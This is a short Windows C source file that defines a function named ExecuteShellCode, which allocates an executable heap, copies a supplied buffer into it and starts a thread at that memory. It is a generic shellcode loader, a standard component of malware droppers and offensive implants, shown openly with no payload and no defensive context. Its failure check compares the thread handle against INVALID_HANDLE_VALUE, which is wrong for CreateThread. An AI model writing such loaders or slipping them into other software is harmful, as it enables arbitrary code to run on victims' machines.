#include "shellcode.h"


BOOL ExecuteShellCode(PCHAR code, DWORD size) {
	HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);

	PVOID Mptr = HeapAlloc(hHep, 0, size);

	RtlCopyMemory(Mptr, code, size);
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, NULL, &dwThreadId);
	if (hThread == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	return TRUE;
	// WaitForSingleObject(hThread, INFINITE);
}